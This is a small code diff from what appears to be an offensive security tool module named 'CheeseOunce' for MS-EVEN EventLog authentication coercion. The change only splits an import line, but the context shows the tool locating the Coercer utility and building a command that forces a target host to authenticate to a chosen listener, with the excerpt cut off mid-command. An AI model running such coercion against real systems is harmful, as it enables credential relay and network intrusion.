@@ -22,7 +22,8 @@ def run(args: Any) -> int:
     print("[*] CheeseOunce: MS-EVEN EventLog coercion")
     print("[*] Target: {}  Listener: {}".format(target, listener or "LISTENER"))
 
-    import subprocess, shutil
+    import subprocess
+    import shutil
     coercer = shutil.which("Coercer") or shutil.which("coercer")
     if coercer:
         cmd = [coercer, "coerce", "-t", target or "", "-l", listener or "",
